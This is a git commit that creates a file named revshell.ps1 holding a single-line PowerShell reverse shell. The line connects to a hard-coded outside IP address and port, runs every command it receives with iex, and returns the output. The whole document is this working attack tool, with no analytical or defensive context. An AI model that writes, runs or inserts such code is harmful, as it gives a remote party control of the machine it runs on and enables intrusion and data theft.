2dd1d90675addd36e8dab9d3bf2eb88ddebebb2c
Jas <7500783+saroyaj@users.noreply.github.com>
2024-01-01 09:23:26 -0500

    Create revshell.ps1

---
+++ revshell.ps1
@@ -0,0 +1,1 @@
+$sm=(New-Object Net.Sockets.TCPClient("138.197.155.58",4949)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
